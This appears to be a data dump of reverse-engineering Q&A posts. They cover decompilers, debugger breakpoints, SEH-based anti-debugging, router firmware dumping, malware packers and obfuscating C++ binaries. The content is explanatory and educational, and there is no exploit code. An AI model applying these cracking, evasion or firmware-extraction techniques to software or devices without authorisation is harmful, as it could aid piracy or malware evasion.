<p>At the basic level, you would want to know how a CLB is controlled then the IOBs and interconnects. the CLBs are the logic the IOBs the are connected to the pins and interconnects link up the CLBs and  IOBs. <a href=""http://www2-c703.uibk.ac.at/teaching/ws2009/esa/fpga.pdf"">This document</a> should give you a lot of insight into how FPGAs are implemented and how you might go about reverse engineering the bit streams. Do note that newer FPGAs are moving to 6-input luts rather than 4-input as was common.</p>

<p>Just keep in mind that the bit stream isn't software - it is a hardware configuration image. So, it's actually very similar to how ENIAC must have been programmed - rewiring circuits and flipping switches to program it - except in this case you are setting up routes with interconnects and logic in the CLBs.</p>

<p>Also the guy behind the Ben NanoNote is writing a <a href=""https://github.com/Wolfgang-Spraul/fpgatools"">fpga-toolchain</a> which I am following avidly.  Since a secondary to my SparcStation collecting hobby is reimplementing sun4m, a SparcStation architecture, in FPGA. After all who wouldn't want to be able to configure an FPGA from an FPGA with your own processor design on it.</p>
","86"
"GUI for transforming Java Bytecode based on decompiled source?","4648","","<p>Okay. So I've just come up with the most amazing program for java developers and reverse-engineerers and I was wondering if something like the following program already exists:</p>

<p>What I'm thinking of is like a middle-ground between something like <a href=""http://dirty-joe.com/"">DirtyJOE</a> and a Java Decompiler.</p>

<p>I already know that:</p>

<ul>
<li>It's possible to inject and manipulate code in a compiled class using <a href=""http://asm.ow2.org"">ASM</a></li>
<li>You can decompile an unobfuscated jar into a readable and understandable state</li>
<li>It's practical to explore and edit a class using a GUI because DirtyJOE can do that amazingly well</li>
</ul>

<p>So is there some sort of program that can show me a decompiled class and allow me to manipulate/inject into different parts of it individually?</p>

<p>For example, I would like replace one method with my own or change a field's access within a compiled class file.</p>

<p>So basically I'm looking for a frontend for ASM built with an interface based on decompiled source code.</p>

<p>Does this exist? If not, what's the closest thing I'm going to get to it?</p>
","<p>You can try using javasnoop (<a href=""https://code.google.com/p/javasnoop/"" rel=""nofollow"">https://code.google.com/p/javasnoop/</a>) to accomplish something similar.</p>

<p>Here's a tutorial for using it -</p>

<p><a href=""http://resources.infosecinstitute.com/hacking-java-applications-using-javasnoop/"" rel=""nofollow"">http://resources.infosecinstitute.com/hacking-java-applications-using-javasnoop/</a></p>
","5944"
"How do you deobfuscate Java classes?","4620","","<p>What tools or methodology do you use to de-obfuscate Java classes?</p>

<hr>

<ul>
<li>I know you can theoretically decompile, modify and recompile, but that's only you fully trust a Java decompiler (and none is regularly updated).</li>
<li>One might also edit java bytecode directly with <a href=""http://rejava.sourceforge.net/"" rel=""nofollow"">reJ</a> but that's tedious and risky (it's easy to break the bytecode without any warnings...)</li>
</ul>
","<p>I am not exactly a Java expert but a while ago I researched the firmware of a car navigation system. For the java bits of it I used the <a href=""http://java.decompiler.free.fr/"" rel=""nofollow"">“Java Decompiler project”</a> and it seemed to work well for decompilation.</p>

<blockquote>
  <p>The “Java Decompiler project” aims to develop tools in order to
  decompile and analyze Java 5 “byte code” and the later versions.</p>
  
  <p>JD-Core is a library that reconstructs Java source code from one or
  more “.class” files. JD-Core may be used to recover lost source code
  and explore the source of Java runtime libraries. New features of Java
  5, such as annotations, generics or type “enum”, are supported. JD-GUI
  and JD-Eclipse include JD-Core library.</p>
  
  <p>JD-GUI is a standalone graphical utility that displays Java source
  codes of “.class” files. You can browse the reconstructed source code
  with the JD-GUI for instant access to methods and fields.</p>
  
  <p>JD-Eclipse is a plug-in for the Eclipse platform. It allows you to
  display all the Java sources during your debugging process, even if
  you do not have them all.</p>
  
  <p>JD-Core works with most current compilers including the following:</p>

<pre><code>jdk1.1.8
jdk1.3.1
jdk1.4.2
jdk1.5.0
jdk1.6.0
jdk1.7.0
jikes-1.22
harmony-jdk-r533500
Eclipse Java Compiler v_677_R32x, 3.2.1 release
jrockit90_150_06
</code></pre>
</blockquote>
","1369"
"windows - Why is the imagebase default 0x400000?","4542","","<p>Having stumbled upon this question (and answer): <a href=""https://stackoverflow.com/questions/2170843/va-virtual-adress-rva-relative-virtual-address"">https://stackoverflow.com/questions/2170843/va-virtual-adress-rva-relative-virtual-address</a> on my quest for understanding Windows' PE format, I'm wondering: why is the default imagebase value 0x400000? 
Why couldn't we just start at 0? A VA would then be, in all practical purposes, equal to an RVA. </p>

<p>I'm clearly missing something, but I've been unable to find a reasonable explanation of this for the last 40 minutes.</p>
","<blockquote>
  <p><strong>why</strong> is the default imagebase value 0x400000?</p>
</blockquote>

<p>From <a href=""http://msdn.microsoft.com/en-us/library/ms809762.aspx"">http://msdn.microsoft.com/en-us/library/ms809762.aspx</a> --</p>

<blockquote>
  <p>In executables produced for Windows NT, the default
  image base is 0x10000. For DLLs, the default is 0x400000. In Windows
  95, the address 0x10000 can't be used to load 32-bit EXEs because it
  lies within a linear address region shared by all processes. <strong>Because
  of this, Microsoft has changed the default base address for Win32
  executables to 0x400000.</strong></p>
</blockquote>

<p>Note that the default (or ""preferred"") base address is set by the linker (GCC's <code>ld</code>, Microsoft VC++'s <code>link.exe</code>, etc.) at build-time; the default (or ""preferred"") base address is <em>not</em> determined by Windows.</p>
","6243"
"How can I control the Hex-Rays decompiler plugin from IDA with scripts?","4522","","<p>I want to use IDA with the Hex-Rays decompiler plugin as part of automated static analysis, possibly on a large number of files without opening each one and telling it to produce a C file individually.  </p>

<p>Ideally, I'd like to run IDA from the command line, and get the decompilation based on initial autoanalysis as output.  This way I can run it as part of <a href=""http://sourceforge.net/projects/mastiff/"">Mastiff</a> or grep for certain functions in a set of binaries.   By my reading of <a href=""http://www.hexblog.com/?p=53"">On batch analysis</a> from the Hex Blog, what I need is an IDA script that interacts with the decompiler plugin, but I can't figure out how to actually do so. </p>

<p>So this leaves me with 2 subquestions:</p>

<ul>
<li>How can I tell the Hex-Rays decompiler to ""Produce C file"" (decompile all functions) from a script?</li>
<li>Does that script need to be IDC, or is IDAPython possible?</li>
</ul>
","<p>[Back in 2013] the decompiler did not have a scripting API. So you had these choices:</p>

<ul>
<li><a href=""http://www.hexblog.com/?p=126"" rel=""nofollow"">Add necessary functions to IDC</a> using a native plugin that calls the decompiler API.</li>
<li>Use <code>ctypes</code> or similar to call the C++ API directly from Python. I posted a small PoC script doing it to the Hex-Rays forum a couple years ago.</li>
<li>If you just want to have the decompiled text, you can use <a href=""https://www.hex-rays.com/products/decompiler/manual/batch.shtml"" rel=""nofollow"">the command line option</a>.</li>
</ul>

<p><a href=""https://www.hex-rays.com/products/ida/6.6/index.shtml"" rel=""nofollow"">IDA 6.6 (released in June 2014)</a> added official Python bindings for the decompiler, so it now can be scripted from Python. For sample code, see <code>vds*.py</code> scripts in the <a href=""https://github.com/idapython/src/tree/master/examples"" rel=""nofollow"">IDAPython repository</a>.</p>
","1932"
"Static analysis of C++ binaries","4498","","<p>When reverse engineering binaries compiled from C++, it is common to see many indirect calls to function pointers in <a href=""http://en.wikipedia.org/wiki/Virtual_method_table"">vtables</a>.  To determine where these calls lead, one must always be aware of the object types expected by the <code>this</code> pointer in <a href=""http://en.wikipedia.org/wiki/Virtual_function"">virtual functions</a>, and sometimes map out a class hierarchy.</p>

<p>In the context of static analysis, what tools or annotation techniques do you use to make virtual functions simpler to follow in your disassembly?  Solutions for all static analysis toolkits are welcome.</p>
","<p>I gave a talk at Recon in 2011 (""Practical C++ Decompilation"") on this exact topic. <a href=""http://www.hexblog.com/wp-content/uploads/2011/08/Recon-2011-Skochinsky.pdf"" rel=""nofollow noreferrer"">Slides</a> and <a href=""https://www.youtube.com/watch?v=efkLG8-G3J0"" rel=""nofollow noreferrer"">video</a> (<a href=""https://www.youtube.com/watch?v=efkLG8-G3J0"" rel=""nofollow noreferrer"">mirror</a>) are available.</p>

<p>The basic approach is simple: represent classes as structures, and vtables as structures of function pointers. There are some tricks I described that allow you to handle inheritance and different vtables for the classes in the same hierarchy. These tricks were also described on <a href=""http://blog.0xbadc0de.be/archives/67"" rel=""nofollow noreferrer"">this blog</a>; I'm not sure if it was based on my talk or an independent work.</p>

<p>One additional thing that I do is add a repeatable comment to each slot in the vtable structure with the implementation's address. This allows you to quickly jump to the implementation when you apply the structure to the vtable slot load:</p>

<p><img src=""https://i.stack.imgur.com/dAGk2.png"" alt=""enter image description here""></p>
","94"
"Kernel debugging - how to set breakpoint at DriverEntry?","4476","","<p>I'm sorry for my bad English. I'm a beginner in Reverse Engineering. I have a problem like this. I was given two files, one is driver's .inf file and the other is driver's .sys file. My mission is to debug this driver and understand its functionality(driver doesn't have physical device). I use 2 machines, one is the host machine which is actually my real computer and a XP virtual machine(VMware). I also use VirtualKD and Windbg. I want to set breakpoint at its DriverEntry.</p>

<p>When I installed driver, I noticed that it ran automatically right after being installed. So I can't set breakpoint at DriverEntry. I restarted virtual machine and set breakpoint in Windbg with all the following commands:
<br>bu Driver!DriverEntry (Driver is driver's ClassName, I saw it in .inf file)
<br>bu Drv!DriverEntry (Drv is its service name when installed)
<br>bu drv!DriverEntry (drv is sys file name, drv.sys)
<br>But Windbg didn't catch any breakpoints. I saw Windbg printed out some infos, I don't know whether it made breakpoints could not catch:</p>

<blockquote>
  <blockquote>
    <hr>
    
    <p>*
    * A driver is mapping physical memory 0064F000->006D0FFF
    * that it does not own.  This can cause internal CPU corruption.
    * A checked build will stop in the kernel debugger
    * so this problem can be fully debugged.
    *</p>
    
    <hr>
  </blockquote>
  
  <p>ERROR: DavReadRegistryValues/RegQueryValueExW(4). WStatus = 5
  ERROR: DavReadRegistryValues/RegQueryValueExW(5). WStatus = 5
  ERROR: DavReadRegistryValues/RegQueryValueExW(6). WStatus = 5
  CodeSet_Init: no ICU
  watchdog!WdUpdateRecoveryState: Recovery enabled.</p>
</blockquote>

<p><br>My second thought was I rolled back my virtual machine and set breakpoints before installing driver. But Windbg said that it could not resolve those breakpoints. And of course it cannot hit any of them.
<br><br> I really don't know how to set this driver's entry. Please help me. Thank you.
<br><br>P/S: probably this driver can communicate with other app through pipe. How can I debug it without infecting its communication?</p>
","<p>You can follow the steps in the comments on this site:</p>

<p><a href=""http://windbg.info/doc/1-common-cmds.html"" rel=""nofollow"">http://windbg.info/doc/1-common-cmds.html</a></p>

<p>This roughly equals to what Igor suggested.</p>
","8672"
"What is the state of art in LLVM IR decompilation?","4464","","<p>LLVM IR is a fairly high-level, typed bitcode which can be directly executed by LLVM and compiled to JIT on the fly. It would not surprise me if a new executable format or programming language was designed directly on top of LLVM, to be executed as if it were an interpreted language.</p>

<p>In this regard, I am curious as to the state of the art on LLVM decompilation. Because it is a typed bitcode specifically designed to be easy to analyze, one might expect that it is relatively easy to decompile (or at least reassemble into a more readable or logical form).</p>

<p>Googling turns up <a href=""http://www.cdl.uni-saarland.de/publications/theses/moll_bsc.pdf"">this BSc thesis</a> which does a relatively rudimentary job, but seemingly few other leads. I might have expected this <a href=""http://www.cdl.uni-saarland.de/people/hack/publications.php"">fellow's supervisor</a> to have done some further research in this area, but it seems his focus is more towards the compiler design area of research.</p>

<p>Are there research projects, commercial prototypes, or even any kinds of active research being done in the field of LLVM decompilation?</p>
","<p>It's extremely easy to decompile. LLVM for a long time shipped with a CBackend that would convert LLVM into C. </p>

<p>The LLVM that is created by todays frontends (clang) is very amenable to any kind of analysis and understanding that you can think of. So you can probably just use normal LLVM tools (opt, llc) to ""decompile"" the IR. I find LLVM IR quite readable on its own, but I'm strange. </p>

<p>However, just like compilation of C to assembler, some information is lost or destroyed. Structure field names are gone, forever replaced with indexes. Their types remain though. Control flow, as a concept, remains, there is no confusion of code and data, but functions can be removed because they are dead or inlined. I believe enum values are removed as well. Parameter information to function remains, as do the types of global variables. </p>

<p>There actually is a decent <a href=""http://lists.cs.uiuc.edu/pipermail/llvmdev/2011-October/043719.html"">post</a> where an LLVM contributor outlines pitfalls and problems with using their bitcode format in the manner that you suggest. Many people seem to have listened to him, so I'm not sure if we'll ever need to move beyond the tools we currently have for understanding LLVM bitcode...</p>
","1439"
"What's 'fs:[0]' doing and how can I execute it step by step?","4448","","<p>In a 32 bits Windows binary, I see this code:</p>

<pre><code>    push next
    push fs:[0]
    mov fs:[0], esp
    int3
    ...
next:
</code></pre>

<p>I see that something happens on the <code>int3</code> (an error), but I don't understand why, and how to follow execution while keeping control.</p>
","<h1>TL;DR</h1>

<ol>
<li><p>the first 3 lines set an exception handler (an 'error catcher')</p></li>
<li><p>the <code>int3</code> generates an exception</p></li>
<li><p>execution resumes at <code>next</code></p></li>
</ol>

<hr>

<h1>Explanation</h1>

<p>this trick is (ab)using <a href=""http://www.microsoft.com/msj/0197/exception/exception.aspx"" rel=""nofollow noreferrer"">Structured Exception Handling</a>, a mechanism to define exception handlers, typically by compilers when <code>try</code>/<code>catch</code> blocks are used.</p>

<p>In 32bits versions of Windows, they can be set on the fly, without any pre-requirement (unless the binary is compiled with /SafeSEH).</p>

<p>The first element of the exception handlers' chain is pointed by the first member of the <a href=""http://en.wikipedia.org/wiki/Win32_Thread_Information_Block"" rel=""nofollow noreferrer"">Thread Information Block (TIB)</a>, in turn a member of the <a href=""http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Thread/TEB.html"" rel=""nofollow noreferrer"">Thread Environment Block (TEB)</a>, which is pointed to by <code>fs:0</code> (which is also reachable 'directly' - via something like <code>ds:7efdd00</code>, depending on the OS version etc)</p>

<p>So here is what happens:</p>

<ol>
<li><p>the first two <code>push</code> reserve stack space for the structure <code>_EXCEPTION_REGISTRATION_RECORD</code>.</p>

<ol>
<li>the new top handler</li>
<li>the previous top handler, which was until now at <code>fs:[0]</code></li>
</ol></li>
<li><p>the <code>mov</code> sets the current stack position as the new structure. When an exception happens, <code>next</code> will be now the first called handler.</p></li>
<li><p><code>int3</code> triggers an exception instantaneously (there are many other kinds of <a href=""http://seh.corkami.com"" rel=""nofollow noreferrer"">exception triggers</a>).</p></li>
<li><p>as an exception is triggered, Windows dispatches the exception to the first handler, and the next one if it's not handled, until one of them has handled it.</p></li>
</ol>

<p><img src=""https://corkami.googlecode.com/svn/wiki/pics/seh_flowchart.png"" alt=""flowchart of Exception handling""></p>

<h1>Following execution</h1>

<p>This is done here under OllyDbg 1.10. YMMV.</p>

<p>As we want to go through exceptions ourselves, we have to ask OllyDbg not to handle them:</p>

<ol>
<li><p>go to debugging options: <kbd>Alt</kbd>-<kbd>O</kbd>, tab <code>Exceptions</code></p></li>
<li><p>unselect <code>INT3 breaks</code></p></li>
</ol>

<p>And when an exception is triggered, we have to enforce that execution is done via exceptions (see below).</p>

<p>Here are 3 methods of increasing level to follow the exception handling execution safely:</p>

<h2>step by step: set a breakpoint manually</h2>

<p>As the handler has just been set on the stack, you can manually set a breakpoint then run.</p>

<ol>
<li><p>select the new handler address on the stack</p>

<p><img src=""https://i.stack.imgur.com/QQQOQ.png"" alt=""new handler on the stack""></p></li>
<li><p>Right-click or <kbd>F10</kbd></p>

<ul>
<li>select <code>Follow in Dump</code></li>
</ul></li>
<li><p>in the dump window, open the menu (same shortcut)</p>

<ul>
<li>select <code>BreakPoint</code>, then <code>Hardware, on execution</code></li>
</ul></li>
<li><p>Execute: menu <code>Debug/Run</code> / shortcut <kbd>F9</kbd> / command-line <code>g</code></p></li>
<li><p>Exceptions will be triggered</p></li>
<li><p>Execute with exception handling: shortcut <kbd>Shift</kbd>-<kbd>F9</kbd> / command-line <code>ge</code>.</p></li>
</ol>

<h2>shortcut: execute until exception handler via command-line</h2>

<ul>
<li><p>as the address is on the stack, the easiest way is to type via the command line <code>ge [esp+4]</code>, which means, <code>Go with Exceptions</code>, until the 2nd address on the stack is encountered. Thus, no need to set and unset a breakpoint.</p>

<ul>
<li>in the case of a more complex example, where the address might not be obvious on the stack anymore, then the absolute formula would be <code>ge ds:[fs:[0]+4]</code>, which just gets the actual address from the TIB.</li>
</ul></li>
</ul>

<h2>keeping full control: break on <code>KiUserExceptionDispatcher</code></h2>

<p><code>KiUserExceptionDispatcher</code> is the Windows API handling all user-mode exceptions. Setting a breakpoint there guarantees that you keep full control - but then, you're in the middle of a Windows API ;) </p>

<p>In this case, you can ask OllyDbg to skip exceptions, as you will still break execution manually in any cases. You might also want to combine that with a <a href=""http://tuts4you.com/download.php?list.53"" rel=""nofollow noreferrer"">script</a>.</p>

<p>Of course, some advanced code might check that you set a breakpoint on it before triggering an exception.</p>
","1912"
"How to set a breakpoint at the specific location on the stack in OllyDbg","4425","","<p>Is there any way to set a breakpoint at the specific location on the stack in OllyDbg?</p>

<p>I have some value (argument of the function) on the stack and I want to break on every memory access at this location.</p>

<p>Thanks in advance.</p>
","<ul>
<li>Take the offset of the stack place you wanna breakpoint at</li>
<li>Go to memory dump, and press <kbd>Ctrl</kbd> + <kbd>G</kbd> (Go), and put the address there, and press <kbd>Ok</kbd></li>
<li>Right click the first value, and go to <code>Breakpoint</code> -> <code>Hardware, on access</code> -> [size]. A <code>Dword</code> is 4 bytes, which is how much bytes the stack viewer shows.</li>
</ul>

<p><img src=""https://i.stack.imgur.com/GBx4H.png"" alt=""enter image description here""></p>
","8789"
"Where can I find tools for reverse engineering Lua","4400","","<p>Since <code>Lua</code> is an interpreted/compiled language that its own compilers and isn't usually translated/compiled with a C compiler. What tools should be used to reverse engineer an application written in <code>Lua</code>?</p>
","<p>If your application is compiled to a binary you might still be able to use normal debuggers like IDA. However, Lua has its own tools for decompiling from machine code and byte code. These links should be kept up to date by the Lua community. </p>

<p><strong>Lua Wiki:</strong> <a href=""http://lua-users.org/wiki/LuaTools"">LuaTools</a></p>

<p>If you need support for Lua 5.2 <a href=""https://github.com/mlnlover11/LuaAssemblyTools"">LuaAssemblyTools</a> is the first to support that.</p>
","2050"
"What is the purpose of 'mov edi, edi'?","4399","","<p>I see this instruction in the beginning of several Windows programs.
It's copying a register to itself, so basically, this acts as a <code>nop</code>.
What's the purpose of this instruction?</p>
","<p>Raymond Chen (Microsoft) has a blog post discussing this in detail:</p>

<p><a href=""http://blogs.msdn.com/b/oldnewthing/archive/2011/09/21/10214405.aspx"">http://blogs.msdn.com/b/oldnewthing/archive/2011/09/21/10214405.aspx</a></p>

<p>In short, it's a compile time addition applied in order to support run time hot patching, so the function can have the first two bytes overwritten with a JMP instruction to redirect execution to another piece of code.</p>
","251"
"How do I see the parameters passed to RegOpenKeyEx, and set a conditional breakpoint?","4386","","<p>I have WinDbg attached to a process I don't have the source code for. I've set a breakpoint with <code>bm ADVAPI32!_RegOpenKeyExW@20</code>. The output of dv is:</p>

<pre><code>Unable to enumerate locals, HRESULT 0x80004005
Private symbols (symbols.pri) are required for locals.
Type "".hh dbgerr005"" for details.
</code></pre>

<p>The output of kP is:</p>

<pre><code>0:000&gt; kP
ChildEBP RetAddr  
001ae174 5b73a79c ADVAPI32!_RegOpenKeyExW@20
001ae1cc 5b77bb20 msenv!?ReadSecurityAddinSetting@@YG_NPAGK@Z+0x8a
001ae468 5b781aad msenv!?    QueryStatusCmd@CVSCommandTarget@@QAEJPBVCIcmdGuidCmdId@@PBU_GUID@@KQAU_tagOLECMD@@PAU_tagOLECMDTEXT@@@Z+0x254
001ae49c 5b786073 msenv!?IsCommandVisible@CVSShellMenu@@QAEJPBVCIcmdGuidCmdId@@_N@Z+0xbf
001ae4e4 5b785fd2 msenv!?IsCommandVisible@CSurfaceCommandingSupport@@UAGJABU_COMMANDTABLEID@@_NPAH@Z+0xa0
. . .
</code></pre>

<p>What can I do to look at the values of the paramaters passed (particularly the second one: <em>LPCTSTR lpSubKey</em>)? Also, what can I do to set a conditional breakpoint based on the value?</p>

<p>I have the Visual Studio debugger as well as WinDbg. I'm willing to try other tools as well.</p>
","<p>This is doable in WinDbg, but the syntax isn't the greatest. The other answers are probably better if you're just looking to get a result quickly. That said, here's how you'd do it.</p>

<p>RegOpenKeyExW is an stdcall function, and it looks like you're on a 32-bit version of Windows, so when you enter the function the first argument will be at <code>ESP+4</code>, the second at <code>ESP+8</code>, etc. The signature for it is:</p>

<pre><code>LONG WINAPI RegOpenKeyEx(
  _In_        HKEY hKey,
  _In_opt_    LPCTSTR lpSubKey,
  _Reserved_  DWORD ulOptions,
  _In_        REGSAM samDesired,
  _Out_       PHKEY phkResult
);
</code></pre>

<p>So at <code>ESP+8</code> you'll find a pointer to a null-terminated Unicode string (<code>lpSubKey</code>). You can test this out by setting an unconditional breakpoint on RegOpenKeyExW and then using <code>du poi(esp+8)</code> to print the string.</p>

<p>To do the next piece – stopping when the value of <code>lpSubKey</code> is equal to some pattern, you can check out <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff556853%28v=vs.85%29.aspx"">MSDN's documentation</a>, which contains an example of doing exactly that. I don't have access to a Windows machine at the moment, but the following should do what you want (adapted from the MSDN example):</p>

<pre><code>bp advapi32!RegOpenKeyExW ""$$&lt;c:\\commands.txt""
</code></pre>

<p>And then create <code>c:\commands.txt</code> with the following contents:</p>

<pre><code>.if (poi(esp+8) != 0) { as /mu ${/v:SubKey} poi(esp+8) } .else { ad /q ${/v:SubKey} }
.if ($spat(@""${SubKey}"", ""Foo*"") == 0)  { gc } .else { .echo SubKey }
</code></pre>

<p>You can replace <code>""Foo*""</code> in the above with any <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff558819%28v=vs.85%29.aspx"">valid string wildcard</a>.</p>

<p>Breaking this down, the first <code>.if</code> sets up an alias named <code>SubKey</code> equal to the contents of the unicode string at <code>esp+8</code>. The second line matches that string against the pattern <code>""Foo*""</code>; if it doesn't match, then <code>gc</code> is used to continue execution without stopping. If it does match, <code>.echo SubKey</code> prints out the string, and then breaks.</p>
","1982"
"Dumping firmware through mtdblock device","4369","","<p>This is my first attempt at doing some reverse engineering. I'm trying to dump the filesystem off a huawei hg523a TalkTalk router.</p>

<p>The problem is its quite limited in the amount of programs that are on the device. Below are a list of programs i can use.</p>

<pre><code>BusyBox vv1.9.1 (2012-03-05 00:16:52 CST) multi-call binary
Currently defined functions:
        [, [[, arp, ash, cat, chmod, chown, cp, date, echo, ftpget,
        ftpput, halt, ifconfig, init, kill, killall, linuxrc,
        ln, ls, mcast, mkdir, mknod, mount, netstat, nslookup,
        ping, poweroff, ps, reboot, rm, route, sh, sleep, test,
        top, traceroute, umount, vconfig, wget
</code></pre>

<p>So im trying to extract the filesystem to another linux machine so i can go through it more eaisely. I can upload single files with the ftpput command.</p>

<pre><code>cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00010000 00001000 ""boot""
mtd1: 00001000 00001000 ""flag""
mtd2: 003c0000 00001000 ""main""
mtd3: 0002d000 00001000 ""config""
</code></pre>

<p>What im trying to do is upload mtdblock0-3 and then mount this on my other machine to explore the folder structure etc.. It looks like from /proc/mounts that it is a squashfs file system.</p>

<pre><code>cat /proc/mounts
rootfs / rootfs rw 0 0
/dev/root / squashfs ro 0 0
none /dev tmpfs rw 0 0
/proc /proc proc rw 0 0
none /var tmpfs rw 0 0
none /tmp tmpfs rw 0 0
none /mnt tmpfs rw 0 0
</code></pre>

<p>So basically i upload the mtdblock0.</p>

<pre><code>ftpput -s -v -u james -p password -l /dev/mtdblock0 -r ftpdir/mtdblock0 192.168.1.64
</code></pre>

<p>and mount it on the other computer with:</p>

<pre><code>root@kali:~/Desktop/talktalk/blocks# mount -t squashfs mtdblock0 /mnt
mount: wrong fs type, bad option, bad superblock on /dev/loop0,
       missing codepage or helper program, or other error
       In some cases useful info is found in syslog - try
       dmesg | tail  or so
</code></pre>

<p>Could anyone guide me in the right direction as to what i might be doing wrong? So it not possible to transfer the filesystem in this way?</p>

<p>thank you in advance for your help.</p>
","<p>As the names in /proc/mtd suggest, mtd0 is probably not a file system, but more likely is the boot loader. Likewise, the name of mtd3 suggests that it contains the saved configuration settings (admin password, wireless settings etc).</p>

<p>The ""flags"" and ""main"" names for mtd1 and mtd2 respectively are a bit ambiguous, but I would expect, due to the name and the size, that mtd2 contains the file system. It also probably contains the Linux kernel as well, so the file system may not start at the beginning of mtd2; once you've ftp'd off a copy of mtd2 you'll have to find the start of the file system and dd it out in order to extract/mount it.</p>

<p>As a side note, don't be surprised if once you find the squashfs file system, your Linux host can't mount it. There are many hacked up versions of squashfs, and you may need to find the right squashfs tools for that particular version and run unsquashfs on the image to extract the files.</p>
","4819"
"How common are virtualized packers in the wild?","4367","","<p>I'm just getting into the RE field, and I learned about virtualized packers (like VMProtect or Themida) in a class about a year ago. How often is malware in the wild really packed with virtualized packers, and what is the state of the art in unpacking them for static analysis?</p>
","<h1>virtualizers usage in the wild</h1>

<p>They are rarely used, and even worse (or better), rarely used in a useful way.</p>

<h2>how they're used</h2>

<p>Typically, it was the use of a virtualizer of over only the main function, or another binary packer, and both cases don't prevent analysis: if you bypass the virtualized packer code, then you get the original unpacked code anyway.</p>

<h2>why they're not used more often</h2>

<ul>
<li>It makes the target bloated and slower</li>
<li>they're not trivial to use correctly</li>
<li>it's fairly common to detect them based on their (usually pirated) licence's watermark, so no matter what you'd virtualize, it would be detected by a specific fingerprint.</li>
</ul>

<h2>a meaningful example</h2>

<p>AFAIK the only known smart use of a virtualizer (VMProtect here) in a malware is Trojan.Clampi, for which Nicolas Fallière wrote a <a href=""http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/inside_trojan_clampi.pdf"">white paper</a>, but it's not so detailed. For this one, the whole viral body was virtualized. </p>

<h1>papers on de-virtualization</h1>

<ul>
<li>Rolf Rolles' <a href=""http://static.usenix.org/event/woot09/tech/full_papers/rolles.pdf"">Unpacking Virtualization Obfuscators</a>, OpenRCE <a href=""http://www.openrce.org/blog/view/1241/Part_3%3a__Optimizing_and_Compiling"">blog entries</a> </li>
<li>sherzo's <a href=""http://repo.meh.or.id/Reverse%20Engineering/Inside%20Code%20Virtualizer.pdf"">inside code virtualizer</a></li>
</ul>

<p>I couldn't find a public download link for these (otherwise good) papers:  </p>

<ul>
<li>Boris Lau's <a href=""http://2008.caro.org/program/dealing-with-virtualization-packers"">Dealing with Virtualization packers</a></li>
<li>Zhenxiang Jim Wan's <a href=""http://www.virusbtn.com/conference/vb2009/abstracts/Wang.xml"">How to recover virtualized x86 instructions by Themida
</a></li>
</ul>
","1479"
"Windows API reference for OllyDbg","4354","","<p>There is an old help file containing Windows API I used few years ago with ollydebug, which can jump to the appropriate help page of function when double clicking on the function in the disassembly window.</p>

<p>Is there a more recent reference like this which includes also Windows 7 library calls ?</p>

<p>I managed to find an online reference in Microsoft website but a local file is much easier to work with...</p>
","<p>If you are using OllyDbg 1.x, you could use the <a href=""http://blog.buguroo.com/?p=4071&amp;lang=en"" rel=""nofollow"">MSDN Help Plugin</a> which simply looks up the requested API call on MSDN. It works for me on my Windows XP sp3 system with OllyDbg 1.x.</p>

<p>Of course, this requires internet connectivity.</p>

<p>Another incomplete option that <em>may</em> work is to obtain the Windows 7 SDK and be sure to install the ""Documentation / Win32 and COM"" sub feature.</p>

<p>Then copy all the *.HXS files from the SDK install folder. Then the only task left is to find a way to convert *.HXS files into a single *.HLP file....not sure if that's possible or not.</p>

<p>FWIW, the <a href=""https://bitbucket.org/daniel_plohmann/simplifire.idascope"" rel=""nofollow"">IDA Scope</a> plugin (for IDA Pro) recommends this in their <a href=""http://pnx-tf.blogspot.com/2012/07/idascope-update-winapi-browsing.html"" rel=""nofollow"">manual</a> for integrating offline MSDN help. Except their instructions have the user extract the HXS files to a folder and point IDA Scope to it where IDA Scope knows how to read/parse the files extracted from the HXS files. The HXS files can be deleted after extracting.</p>
","1606"
"What kinds of steps can I take to make my C++ application harder to reverse engineer?","4341","","<p>If I am building a C++ application and I want to make it more difficult to reverse engineer, what steps can I take to do this?</p>

<ul>
<li>Does the choice of compiler affect this?</li>
<li>What about compiler flags, presumably a high optimization level would help, what about other flags?</li>
<li>Does stripping symbols help and not building with debug symbols?</li>
<li>Should I encrypt any internal data such as static strings?</li>
<li>What other steps might I take?</li>
</ul>
","<p><strong>Compiler</strong></p>

<p>The choice of a compiler has minimal effects on the difficulty to reverse engineer your code. The important things to minimize are all related to information leaks from your code. You want to at least disable any runtime type information (RTTI). The leakage of type information and the simplicity of the instruction set of the virtual machine is one of the reasons CLR and JVM code is easier to reverse engineer. They also have an JIT which applies optimizations to code which may reduce the strength of obfuscation. Obfuscation is basically the opposite of optimization and a lot of obfuscations are solved by first applying an optimization pass.</p>

<p><strong>Debugging information</strong></p>

<p>I would advice you to also turn off any debugging information, even if it doesn't leak any majorly important information today it might do so tomorrow. The amount of information leakage from the debug information varies from compiler to compiler and from binary format to binary format. For instance Microsoft Visual C++ keeps all important debugging information in an external database, usually in the form of a PDB. The most you might leak is the path you used when building your software.</p>

<p><strong>Strings</strong></p>

<p>When it comes to strings you should definitely encrypt them if you need them at all. I would aim to replace all the ones that are for error tracing and error logging with numeric enumerations. Strings which reveal any sort of information about what is going on right now in your binary needs to be unavailable. If you encrypt the strings, they will be decrypted. Try to avoid them as much as possible.</p>

<p><strong>System APIs</strong></p>

<p>Another strong source of information leakage is imports of system APIs. You want to make sure that any imported function which has a known signature is well-hidden and can not be found using automatic analysis. So an array of function pointers from something like LoadLibrary/GetProcAddress is out of the question. All calls to imported functions need to go through a one way function and needs to be embedded within an obfuscated block.</p>

<p><strong>Standard runtime libraries</strong></p>

<p>Something a lot of people forget to take into consideration is the information leaked by standard libraries, such as the runtime of your C++ compiler. I would avoid the use of it completely. This is because most experienced reverse engineers will have signatures prepared for a lot of standard libraries.</p>

<p><strong>Obfuscation</strong></p>

<p>You should also cover any critical code with some sort of heavy obfuscation. Some of the heavier and cheaper obfuscations right now are <a href=""http://oreans.com/codevirtualizer.php"">CodeVirtualizer/Themida</a> and <a href=""http://vmpsoft.com/"">VMProtect</a>. Be aware that these packages have an abundance of defects though. They will sometimes transform your code to something which will not be the equivalent of the original which can lead to instability. They also slow down the obfuscated code significantly. A factor of 10000 times slower is not uncommon. There's also the issue of triggering more false positives with anti-virus software. I would advice you to sign your software using a reputable certificate authority.</p>

